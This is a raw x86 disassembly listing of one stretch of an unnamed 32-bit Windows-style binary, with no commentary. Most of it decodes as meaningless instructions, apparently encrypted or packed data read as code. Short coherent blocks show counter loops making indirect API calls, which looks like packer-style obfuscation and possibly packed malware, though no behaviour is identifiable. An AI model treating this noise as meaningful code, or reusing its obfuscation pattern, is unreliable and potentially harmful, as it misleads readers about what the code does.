  40e13f:	jo     0x40e186
  40e141:	xor    esi,esp
  40e143:	push   ds
  40e144:	mov    eax,0x669e03d3
  40e149:	les    ebx,FWORD PTR [esi]
  40e14b:	mov    ecx,0x70b998cc
  40e150:	adc    al,0x7b
  40e152:	dec    eax
  40e153:	aas    
  40e154:	gs sti 
  40e156:	cmc    
  40e157:	and    al,0x2a
  40e159:	fsubr  st(5),st
  40e15b:	dec    ebx
  40e15c:	out    0x54,eax
  40e15e:	ds mov dh,0x4b
  40e161:	gs mov bl,0x41
  40e164:	bound  edi,QWORD PTR [ebp-0x61e9d877]
  40e16a:	js     0x40e198
  40e16c:	popa   
  40e16d:	jae    0x40e0f8
  40e16f:	sub    eax,DWORD PTR [ecx+0x23ad1d8c]
  40e175:	push   ss
  40e176:	mov    eax,ds:0x4d329754
  40e17b:	jp     0x40e1be
  40e17d:	add    al,0xad
  40e17f:	xor    eax,DWORD PTR [ecx]
  40e181:	mov    DWORD PTR [ebx-0x6cb4c125],edx
  40e187:	push   es
  40e188:	outs   dx,BYTE PTR ds:[esi]
  40e189:	mov    dl,al
  40e18b:	imul   edx,DWORD PTR [eax+edi*2+0xc98efd],0x43
  40e193:	aam    0x59
  40e195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e196:	sub    BYTE PTR [ecx-0x3a],bh
  40e199:	mov    esp,0x635979a8
  40e19e:	(bad)
  40e1a2:	jae    0x40e197
  40e1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a5:	fwait
  40e1a6:	jne    0x40e1aa
  40e1a8:	adc    DWORD PTR [ebp-0x5b],0xffffffbd
  40e1ac:	and    dh,bl
  40e1ae:	push   esi
  40e1af:	shl    DWORD PTR [ecx],0x92
  40e1b2:	ror    DWORD PTR [edi-0x38d95e71],cl
  40e1b8:	adc    DWORD PTR [edx],edi
  40e1ba:	mov    dh,0x90
  40e1bc:	xchg   ebp,eax
  40e1bd:	pop    ss
  40e1be:	mov    WORD PTR [esi+0x6c],?
  40e1c1:	adc    edx,DWORD PTR [eax]
  40e1c3:	mov    esp,0xf317bb99
  40e1c8:	cmp    eax,0x3797994a
  40e1cd:	or     edi,esp
  40e1cf:	and    BYTE PTR [ecx+0x42],cl
  40e1d2:	jbe    0x40e215
  40e1d4:	inc    ecx
  40e1d5:	xlat   BYTE PTR ds:[ebx]
  40e1d6:	nop
  40e1d7:	jns    0x40e243
  40e1d9:	gs push eax
  40e1db:	rcl    BYTE PTR [ecx+0x5c],1
  40e1de:	inc    eax
  40e1df:	jb     0x40e1c9
  40e1e1:	ret    
  40e1e2:	dec    ecx
  40e1e3:	fdivr  DWORD PTR [esi-0x2e7da22c]
  40e1e9:	in     eax,0x74
  40e1eb:	rcl    DWORD PTR [ecx],0x98
  40e1ee:	mov    ebp,0x6bfcf95c
  40e1f3:	in     al,dx
  40e1f4:	enter  0xf055,0x1e
  40e1f8:	xchg   esi,eax
  40e1f9:	jmp    0xbe1f746a
  40e1fe:	mov    dl,0xe6
  40e200:	mov    bh,0x90
  40e202:	mov    bh,0x88
  40e204:	(bad)  
  40e205:	mov    dh,0x44
  40e207:	push   es
  40e208:	fwait
  40e209:	xor    eax,DWORD PTR [ebx+0x4e321082]
  40e20f:	lea    ebx,[ebp+edi*4-0x72]
  40e213:	in     al,0x14
  40e215:	mov    ah,0x5f
  40e217:	xor    bl,cl
  40e219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e21a:	icebp  
  40e21b:	test   BYTE PTR [esi],bl
  40e21d:	hlt    
  40e21e:	pop    edi
  40e21f:	inc    esi
  40e220:	and    DWORD PTR [edx+0x41],ebp
  40e223:	xchg   BYTE PTR [esi+edx*1-0x55584b63],al
  40e22a:	or     DWORD PTR [esi],ebp
  40e22c:	dec    ebp
  40e22d:	not    BYTE PTR [edi+0x41]
  40e230:	add    BYTE PTR [edi-0x62c5dd74],ah
  40e236:	mov    dh,0x78
  40e238:	nop
  40e239:	test   BYTE PTR [edi],dl
  40e23b:	mov    ch,0x71
  40e23d:	or     eax,0xf924e01e
  40e242:	push   ss
  40e243:	fist   DWORD PTR [ebx]
  40e245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e246:	popf   
  40e247:	jg     0x40e1d2
  40e249:	mov    ebp,0x287e0f97
  40e24e:	push   ebp
  40e24f:	jb     0x40e253
  40e251:	push   es
  40e252:	bound  ebp,QWORD PTR [ecx]
  40e254:	pop    ebp
  40e255:	outs   dx,BYTE PTR ds:[esi]
  40e256:	lods   al,BYTE PTR ds:[esi]
  40e257:	jg     0x40e24c
  40e259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e25a:	stos   BYTE PTR es:[edi],al
  40e25b:	cmp    al,0x9d
  40e25d:	sub    ah,bl
  40e25f:	fwait
  40e260:	xchg   ebp,eax
  40e261:	mov    dl,0xfb
  40e263:	jl     0x40e23e
  40e265:	or     DWORD PTR [ebx],esp
  40e267:	xchg   esp,eax
  40e268:	mov    ebx,0x449babe0
  40e26d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e26e:	jmp    0x40e2dc
  40e270:	jno    0x40e2d7
  40e272:	dec    ebx
  40e273:	pop    esi
  40e274:	jae    0x40e246
  40e276:	push   esi
  40e277:	xchg   ebp,eax
  40e278:	loope  0x40e203
  40e27a:	add    DWORD PTR [ebp+0x2581fc45],ecx
  40e280:	std    
  40e281:	cld    
  40e282:	inc    edx
  40e283:	add    BYTE PTR [eax],al
  40e285:	add    BYTE PTR [eax],al
  40e287:	add    BYTE PTR [ebx+0x42fcfd0d],cl
  40e28d:	add    BYTE PTR [ecx-0x77],al
  40e290:	or     eax,0x42fcfd
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	test   BYTE PTR [ecx],0xcd
  40e379:	fistp  QWORD PTR [ebx]
  40e37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e37c:	jo     0x40e3ee
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e320
  40e383:	imul   esi,ecx,0x76
  40e386:	mov    ebp,DWORD PTR [edx]
  40e388:	adc    eax,0x79880e80
  40e38d:	mov    edx,DWORD PTR [eax-0x68]
  40e390:	add    BYTE PTR [ebp-0x18],al
  40e393:	pop    ds
  40e394:	and    DWORD PTR [esi-0x35ad6220],0x20167c2
  40e39e:	jl     0x40e322
  40e3a0:	pop    ds
  40e3a1:	xchg   esp,eax
  40e3a2:	icebp  
  40e3a3:	hlt    
  40e3a4:	lds    ecx,FWORD PTR [edi+ebp*4]
  40e3a7:	inc    edx
  40e3a8:	stos   DWORD PTR es:[edi],eax
  40e3a9:	iret   
  40e3aa:	rcl    BYTE PTR [eax+0x6b],cl
  40e3ad:	fdiv   QWORD PTR [eax+0x3261dd12]
  40e3b3:	push   ss
  40e3b4:	mov    ?,WORD PTR [ebx+edi*4+0x1e8b3019]
  40e3bb:	ss mov ch,0x32
  40e3be:	xor    eax,DWORD PTR [eax+ecx*8+0x3bf9d891]
  40e3c5:	jbe    0x40e40e
  40e3c7:	repnz out 0x43,al
  40e3ca:	sbb    BYTE PTR [eax+0x379d6b91],al
  40e3d0:	fistp  QWORD PTR [edx]
  40e3d2:	add    DWORD PTR [ecx-0x485d38b4],ebx
  40e3d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3d9:	lahf   
  40e3da:	data16 clc 
  40e3dc:	push   0xffffffa6
  40e3de:	repz (bad) 
  40e3e1:	shl    BYTE PTR [ebx+0x3a],0xdc
  40e3e5:	jp     0x40e448
  40e3e7:	(bad)  
  40e3e8:	or     BYTE PTR gs:[eax+0x4a],dl
  40e3ec:	mov    al,ds:0xdbfcf1f
  40e3f1:	pop    es
  40e3f2:	into   
  40e3f3:	dec    ebp
  40e3f4:	jl     0x40e3f6
  40e3f6:	sub    bh,cl
  40e3f8:	sahf   
  40e3f9:	fisttp WORD PTR [ecx+0x0]
  40e3fc:	imul   ecx,DWORD PTR [esp+edx*4-0x43],0xed043ef6
  40e404:	jge    0x40e3ae
  40e406:	push   0xffffffa9
  40e408:	cdq    
  40e409:	xchg   ecx,eax
  40e40a:	sbb    eax,0x7b441380
  40e40f:	xor    al,0x8f
  40e411:	jecxz  0x40e451
  40e413:	jmp    0x8e74:0x7439e45f
  40e41a:	leave  
  40e41b:	jno    0x40e498
  40e41d:	pop    esi
  40e41e:	push   DWORD PTR [ecx]
  40e420:	inc    ebx
  40e421:	test   BYTE PTR [edx-0x7895e2d2],al
  40e427:	fstp   QWORD PTR [eax-0x6a119731]
  40e42d:	cmp    al,0xc7
  40e42f:	mov    es,WORD PTR [ebp+0x36]
  40e432:	ins    DWORD PTR es:[edi],dx
  40e433:	cwde   
  40e434:	imul   ebx,DWORD PTR [ecx+0x33],0xf4820dd7
  40e43b:	(bad)  
  40e43c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e43d:	je     0x40e3db
  40e43f:	pop    ss
  40e440:	push   ebp
  40e441:	stc    
  40e442:	adc    ah,BYTE PTR [ecx+eax*2]
  40e445:	sbb    al,0x9f
  40e447:	cdq    
  40e448:	retf   
  40e449:	add    eax,DWORD PTR [edx+0x3]
  40e44c:	js     0x40e3fb
  40e44e:	pop    edi
  40e44f:	pop    esp
  40e450:	jp     0x40e498
  40e452:	push   esp
  40e453:	mov    ch,0x67
  40e455:	outs   dx,DWORD PTR ds:[esi]
  40e456:	dec    esi
  40e457:	pushf  
  40e458:	dec    edi
  40e459:	repz jge 0x40e48b
  40e45c:	push   0x33
  40e45e:	and    DWORD PTR [esi+0x46b6b45d],edx
  40e464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e465:	dec    ebx
  40e466:	ror    DWORD PTR [esi-0xb964894],1
  40e46c:	mov    WORD PTR [edi-0x1a],fs
  40e46f:	mov    bh,0xdd
  40e471:	push   es
  40e472:	retf   0x706b
  40e475:	pushf  
  40e476:	aaa    
  40e477:	fisubr WORD PTR [esi+0x1a]
  40e47a:	aas    
  40e47b:	dec    esp
  40e47c:	popa   
  40e47d:	loope  0x40e42d
  40e47f:	aad    0x54
  40e481:	cmc    
  40e482:	and    edx,eax
  40e484:	popa   
  40e485:	lods   eax,DWORD PTR ds:[esi]
  40e486:	repnz outs dx,DWORD PTR ds:[esi]
  40e488:	jl     0x40e446
  40e48a:	fucomp st(2)
  40e48c:	jmp    0x46c0f879
  40e491:	jl     0x40e4d7
  40e493:	pop    ds
  40e494:	xlat   BYTE PTR ds:[ebx]
  40e495:	push   0x36
  40e497:	sbb    DWORD PTR [eax],0xffffffa0
  40e49a:	nop
  40e49b:	add    BYTE PTR [esi+0x59feb4c5],dh
  40e4a1:	pop    ecx
  40e4a2:	add    esi,0xfffffff7
  40e4a5:	aas    
  40e4a6:	mov    ds:0x4ba22d1b,eax
  40e4ab:	or     DWORD PTR [edi-0x5e],ebx
  40e4ae:	jo     0x40e4f8
  40e4b0:	fwait
  40e4b1:	mov    cl,0xbe
  40e4b3:	(bad)  
  40e4b5:	mov    bh,0x6a
  40e4b7:	lods   eax,DWORD PTR ds:[esi]
  40e4b8:	xchg   BYTE PTR [eax+0x1950d812],ah
  40e4be:	sub    eax,0x565af96e
  40e4c3:	rcr    BYTE PTR [ebp-0x3],0x29
  40e4c7:	pop    esi
  40e4c8:	cmp    DWORD PTR [eax],ebx
  40e4ca:	cmp    ch,BYTE PTR [esi]
  40e4cc:	xlat   BYTE PTR ds:[ebx]
  40e4cd:	push   0xe845c7b4
  40e4d2:	xor    DWORD PTR [ebp-0x1c7e0764],eax
  40e4d8:	call   0xe845:0x8d000039
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0xea99740f
  40e4f5:	cwde   
  40e4f6:	push   eax
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	pop    eax
  40e500:	int3   
  40e501:	sub    DWORD PTR gs:[ebx-0x5e],eax
  40e505:	xchg   esi,eax
  40e506:	nop
  40e507:	retf   
  40e508:	aas    
  40e509:	jae    0x40e544
  40e50b:	dec    ebx
  40e50c:	xor    esi,DWORD PTR [esi]
  40e50e:	mov    al,0x15
  40e510:	ficomp DWORD PTR [ecx-0x6b]
  40e513:	(bad)  
  40e515:	jmp    0x797889ec
  40e51a:	mov    esp,0x978308c4
  40e51f:	dec    ecx
  40e520:	add    eax,0x4faeb3cd
  40e526:	or     ah,dl
  40e528:	in     al,0x8b
  40e52a:	out    0xd7,al
  40e52c:	div    BYTE PTR [edi-0x9]
  40e52f:	dec    edx
  40e530:	mov    fs,WORD PTR [esi]
  40e532:	cmp    al,0x72
  40e534:	mov    edi,0x6c2eb831
  40e539:	gs loope 0x40e53d
  40e53c:	push   ss
  40e53d:	or     BYTE PTR [ebx+eax*4-0x27fd62f5],dl
  40e544:	add    bl,BYTE PTR [ecx+0x6c]
  40e547:	cdq    
  40e548:	mov    ch,0xa5
  40e54a:	jnp    0x40e5a5
  40e54c:	aam    0x38
  40e54e:	jg     0x40e555
  40e550:	faddp  st(2),st
  40e552:	repnz arpl WORD PTR [edi+ebp*1+0x37],dx
  40e557:	mov    bh,0xa6
  40e559:	test   ah,al
  40e55b:	adc    BYTE PTR [eax-0x65089bb5],bh
  40e561:	sub    bl,BYTE PTR [ebx-0x603ff23b]
  40e567:	cmp    esi,DWORD PTR [esi+edi*1]
  40e56a:	sahf   
  40e56b:	ss int3 
  40e56d:	jge    0x40e56f
  40e56f:	shr    edx,0xb1
  40e572:	retf   0x78bf
  40e575:	xchg   DWORD PTR [edi],esp
  40e577:	dec    edi
  40e578:	ins    BYTE PTR es:[edi],dx
  40e579:	inc    edi
  40e57a:	jnp    0x40e565
  40e57c:	sub    edi,ecx
  40e57e:	ins    BYTE PTR es:[edi],dx
  40e57f:	push   esi
  40e580:	push   esi
  40e581:	cmp    DWORD PTR [eax],esp
  40e583:	sbb    esp,ecx
  40e585:	sbb    BYTE PTR [ecx+eiz*1],0x8c
  40e589:	imul   edx,DWORD PTR [ebx],0xffffffa6
  40e58c:	in     al,dx
  40e58d:	mov    ebx,0xaf097303
  40e592:	jbe    0x40e532
  40e594:	jmp    DWORD PTR [edi-0x1c]
  40e597:	push   cs
  40e598:	mov    esp,0x9116ae3a
  40e59d:	dec    edx
  40e59e:	stos   BYTE PTR es:[edi],al
  40e59f:	xchg   edi,eax
  40e5a0:	add    BYTE PTR [edi-0x55],ch
  40e5a3:	dec    ecx
  40e5a4:	cmp    eax,0xf4b8cb64
  40e5a9:	push   es
  40e5aa:	add    cl,cl
  40e5ac:	je     0x40e5c4
  40e5ae:	out    dx,al
  40e5af:	mov    ?,esi
  40e5b1:	call   0x2702:0x82d661d5
  40e5b8:	mov    ds:0x63faa99c,eax
  40e5bd:	stos   BYTE PTR es:[edi],al
  40e5be:	jbe    0x40e633
  40e5c0:	xchg   ebx,eax
  40e5c1:	js     0x40e582
  40e5c3:	mov    esp,0x687d62a8
  40e5c8:	xacquire xchg BYTE PTR [esi-0x77a19821],bl
  40e5cf:	out    0x67,al
  40e5d1:	pop    edx
  40e5d2:	outs   dx,BYTE PTR ds:[esi]
  40e5d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5d4:	xor    eax,0x36d19394
  40e5d9:	dec    eax
  40e5da:	lods   eax,DWORD PTR ds:[esi]
  40e5db:	pop    eax
  40e5dc:	mov    ss,WORD PTR [edi+edi*2+0x60]
  40e5e0:	dec    ecx
  40e5e1:	mov    ss,ebp
  40e5e3:	jg     0x40e5a5
  40e5e5:	popf   
  40e5e6:	add    BYTE PTR [bx+di-0xe98],dl
  40e5eb:	and    ebp,DWORD PTR [esi-0x7c5414e9]
  40e5f1:	ret    0x4883
  40e5f4:	push   ecx
  40e5f5:	cmp    BYTE PTR [edx-0x80],cl
  40e5f8:	ret    
  40e5f9:	push   edi
  40e5fa:	adc    eax,0x1f785b4b
  40e5ff:	add    BYTE PTR [esi+0x7b35aefa],dl
  40e605:	push   edx
  40e606:	adc    ebx,ebx
  40e608:	inc    ebx
  40e609:	movzx  edx,ch
  40e60c:	call   0x25648b6f
  40e611:	mov    ecx,0x6303d58b
  40e616:	adc    eax,0xfc7a3ebf
  40e61b:	out    dx,al
  40e61c:	inc    edx
  40e61d:	pop    es
  40e61e:	jne    0x40e66b
  40e620:	push   ss
  40e621:	adc    eax,0x5135cc6a
  40e626:	neg    BYTE PTR [ecx+0x48fd746e]
  40e62c:	imul   BYTE PTR [esi]
  40e62e:	dec    esp
  40e62f:	cmp    eax,0x1f7f6e1e
  40e634:	repz push esp
  40e636:	inc    esp
  40e637:	xor    DWORD PTR [esi],ebx
  40e639:	mov    DWORD PTR [edx-0x7398f30d],esp
  40e63f:	sub    esi,DWORD PTR [ebp+0x4]
  40e642:	mov    edx,0x86c9c751
  40e647:	cli    
  40e648:	data16 mov dh,0xa8
  40e64b:	sahf   
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	pop    ebx
  40e6db:	mov    dh,BYTE PTR [ebp-0x54]
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	pop    ss
  40e6e7:	jg     0x40e71b
  40e6e9:	lahf   
  40e6ea:	lods   eax,DWORD PTR ds:[esi]
  40e6eb:	cld    
  40e6ec:	ret    
  40e6ed:	jbe    0x40e680
  40e6ef:	test   DWORD PTR [esi],ebp
  40e6f1:	nop
  40e6f2:	mov    DWORD PTR [edi-0x76eee9be],esi
  40e6f8:	outs   dx,BYTE PTR ds:[esi]
  40e6f9:	push   ebx
  40e6fa:	fucomi st,st(0)
  40e6fc:	mov    esp,0xf5b7de3e
  40e701:	ins    DWORD PTR es:[edi],dx
  40e702:	in     al,0x18
  40e704:	lods   eax,DWORD PTR ds:[esi]
  40e705:	sbb    DWORD PTR ds:0x89f4dea7,edx
  40e70b:	fst    QWORD PTR [ebp+0x1d]
  40e70e:	push   edx
  40e70f:	mov    eax,ds:0xe29ee26d
  40e714:	scas   eax,DWORD PTR es:[edi]
  40e715:	ins    BYTE PTR es:[edi],dx
  40e716:	fdiv   DWORD PTR [eax-0x25844c7a]
  40e71c:	push   ebp
  40e71d:	jl     0x40e775
  40e71f:	inc    edi
  40e720:	mov    ah,0x46
  40e722:	outs   dx,BYTE PTR ds:[esi]
  40e723:	ficom  WORD PTR [eax-0x608078ca]
  40e729:	les    ecx,FWORD PTR es:[edx+0x5a]
  40e72d:	pusha  
  40e72e:	pop    esi
  40e72f:	stos   BYTE PTR es:[edi],al
  40e730:	inc    esp
  40e731:	aaa    
  40e732:	je     0x40e720
  40e734:	in     al,0x28
  40e736:	(bad)  
  40e737:	sbb    dh,BYTE PTR [eax+0x64]
  40e73a:	mov    esi,0x60281410
  40e73f:	loopne 0x40e7bd
  40e741:	cmp    edi,DWORD PTR [esi+0x4f]
  40e744:	pop    esi
  40e745:	mov    esi,0xd5085eb6
  40e74a:	add    al,0x10
  40e74c:	mov    dh,BYTE PTR [ebx]
  40e74e:	loopne 0x40e71c
  40e750:	bswap  ebp
  40e752:	cmp    al,0x80
  40e754:	ss dec ecx
  40e756:	ror    DWORD PTR [eax],1
  40e758:	xor    DWORD PTR [ebp+0x39],esp
  40e75b:	mov    esp,0x2e21b5c
  40e760:	xchg   ebx,eax
  40e761:	lods   al,BYTE PTR ds:[esi]
  40e762:	xor    al,0xc
  40e764:	ja     0x40e7c4
  40e766:	cmp    al,0xf3
  40e768:	in     al,dx
  40e769:	adc    BYTE PTR [edx],dh
  40e76b:	mov    ebx,0x439c18b3
  40e770:	sub    BYTE PTR [esi],ch
  40e772:	sbb    eax,0x2053dc99
  40e777:	outs   dx,BYTE PTR ds:[esi]
  40e778:	or     dh,BYTE PTR [ebp+edx*2+0x1eba48c2]
  40e77f:	jne    0x40e7af
  40e781:	lock sub BYTE PTR [ebp+0x5e],0x15
  40e786:	aas    
  40e787:	jle    0x40e724
  40e789:	push   cs
  40e78a:	jl     0x40e70f
  40e78c:	inc    ebx
  40e78d:	add    eax,0xaaa3f905
  40e792:	imul   esp,DWORD PTR [edx+0x101ed9c3],0xffffff84
  40e799:	xlat   BYTE PTR ds:[ebx]
  40e79a:	(bad)
  40e79d:	inc    esi
  40e79e:	sbb    BYTE PTR [ebx],dh
  40e7a0:	loop   0x40e775
  40e7a2:	mov    edx,0x5d40cd9a
  40e7a7:	push   ebp
  40e7a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7a9:	jno    0x40e762
  40e7ab:	mov    al,ds:0xd0f4f009
  40e7b0:	jnp    0x40e7d3
  40e7b2:	jge    0x40e7af
  40e7b4:	mov    al,0x46
  40e7b6:	xchg   BYTE PTR [edx+0x7ed1cae0],bl
  40e7bc:	and    DWORD PTR [eax+0x2],0xe6690136
  40e7c3:	adc    eax,0xb2f9a309
  40e7c8:	aaa    
  40e7c9:	mov    al,ds:0xc126a882
  40e7ce:	mov    BYTE PTR [esi-0x285f8b01],dl
  40e7d4:	adc    edi,DWORD PTR [esi+edi*4-0x56]
  40e7d8:	pusha  
  40e7d9:	xchg   ebp,eax
  40e7da:	add    eax,0x592153d3
  40e7df:	aad    0xa5
  40e7e1:	or     eax,DWORD PTR [edx+esi*1]
  40e7e4:	js     0x40e80f
  40e7e6:	inc    esp
  40e7e7:	imul   esi,DWORD PTR [eax+0x72],0xffffff95
  40e7eb:	sbb    BYTE PTR [eax],ah
  40e7ed:	dec    edi
  40e7ee:	mov    BYTE PTR [ebp-0x39],al
  40e7f1:	jg     0x40e775
  40e7f3:	sub    BYTE PTR [eax-0x3e7d1bb],ch
  40e7f9:	inc    esi
  40e7fa:	sub    cl,BYTE PTR [eax]
  40e7fc:	sub    BYTE PTR [esi-0x6a18ab82],dl
  40e802:	(bad)  
  40e803:	leave  
  40e804:	das    
  40e805:	pop    esi
  40e806:	popa   
  40e807:	popa   
  40e808:	adc    eax,0xf634bdf8
  40e80d:	dec    ecx
  40e80e:	inc    ebp
  40e80f:	mov    BYTE PTR [edi],al
  40e811:	xchg   DWORD PTR [ecx*2+0x760422ae],edi
  40e818:	or     ebp,DWORD PTR [ebp-0x52]
  40e81b:	pop    es
  40e81c:	pop    ds
  40e81d:	add    eax,0xf949f966
  40e822:	pop    esi
  40e823:	ror    eax,cl
  40e825:	frstor cs:[ecx]
  40e828:	fiadd  WORD PTR [ebx+0x60]
  40e82b:	gs mov esi,0xc9b5fb2f
  40e831:	dec    edi
  40e832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	and    al,0xe8
  40e94b:	mov    edi,0x70a024cf
  40e950:	jo     0x40e915
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e94e
  40e956:	jecxz  0x40e9aa
  40e958:	push   es
  40e959:	es ja  0x40e965
  40e95c:	sbb    al,0x57
  40e95e:	mov    ah,0xf9
